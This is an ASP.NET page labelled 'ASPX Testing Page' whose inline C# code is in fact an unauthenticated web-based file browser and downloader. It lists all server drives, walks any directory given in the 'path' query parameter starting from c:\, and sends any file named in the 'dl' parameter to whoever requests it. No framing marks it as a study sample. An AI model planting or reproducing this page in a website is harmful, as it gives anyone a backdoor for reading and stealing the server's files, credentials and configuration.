<%@ Page Language="c#" AutoEventWireup="false" CodeBehind="Default.aspx.vb" %>
<%
	System.IO.DriveInfo[] allDrives = System.IO.DriveInfo.GetDrives();
	List<string> dirs = new List<string>();
	foreach (System.IO.DriveInfo d in allDrives) {
		dirs.Add(String.Concat("<a href=?path=", d.Name, ">", d.Name, "</a>"));
    }
	FileTextLabel.Text = string.Join(", ", dirs.ToArray());
	FileListLabel.Text = HttpRuntime.AppDomainAppPath;
	if (!IsPostBack) {
		String dl = Request.QueryString["dl"];
		if(dl != null) {
			string fileName = System.IO.Path.GetFileName(@dl);

			System.Web.HttpResponse response = System.Web.HttpContext.Current.Response;
			response.ClearContent();
			response.Clear();
			response.ContentType = "text/plain";
			response.AddHeader("Content-Disposition", "attachment; filename="+@fileName+";");
			response.TransmitFile(@dl);
			response.Flush();
			response.End();
		}
		String path = Request.QueryString["path"];
		String mypath = @"c:\";
		if(path != null) {
			mypath = path;
		}
		String[] allfiles = System.IO.Directory.GetFiles(mypath);
		String[] alldirs = System.IO.Directory.GetDirectories(mypath);
		String[] all = allfiles.Concat(alldirs).ToArray();
		List<string> files = new List<string>();
		foreach (string filePath in all) {
			String entry = @filePath;
			if(System.IO.Directory.Exists(@filePath)) {
				entry = String.Concat("D: <a href=?path=", System.Web.HttpUtility.UrlEncode(@filePath), ">", @filePath, "</a>");
			} else if(System.IO.File.Exists(@filePath)) {
				entry = String.Concat("F: <a style=color:orange; href=?path=", @mypath, "&dl=", @filePath, ">", @filePath, "</a>");
			}
			files.Add(entry);
		}
		FileListLabel.Text = string.Join("<br/>", files.ToArray());
	}
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>ASPX Testing Page</title>
		<style>
		#HelloWorldLabel {
			background-color: rgba(0,255,0,0.2);
		}
		#FileTextLabel {
			background-color: yellow;
		}
		</style>
</head>
<body>
    <form id="form1" runat="server">
    <div>
		<asp:Label runat="server" id="FileTextLabel"></asp:Label>
		<br>
        <asp:Label runat="server" id="FileListLabel"></asp:Label>
    </div>
    </form>
</body>
</html>
